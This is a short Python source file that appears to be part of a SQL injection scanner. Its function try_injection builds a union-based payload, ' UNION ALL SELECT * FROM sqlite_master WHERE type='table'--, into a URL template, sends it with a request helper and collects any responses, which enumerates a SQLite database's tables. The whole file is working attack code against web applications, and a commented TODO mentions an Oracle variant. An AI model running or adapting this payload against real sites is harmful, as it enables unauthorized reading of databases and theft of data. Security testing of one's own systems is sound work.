import methods


def try_injection(method: str, url: str) -> list[list[str]]:
    # Union based
    exploited = []

    i = url.find("{")
    j = url.find("}", i)
    if j != -1:
        ## Assume url is looking like "SELECT x FROM y WHERE z ='{parameter}'"
        exploit_url = url[0 : i + 1] + "/"

        urls = [
            f"{exploit_url}' UNION ALL SELECT * FROM sqlite_master WHERE type='table'--"
            # oracle_exploit_url = ""  # TODO
        ]

        for url in urls:
            tried = methods.str_to_request_function(method)(url)
            if len(tried) != 0:
                exploited.append(tried)

    return exploited
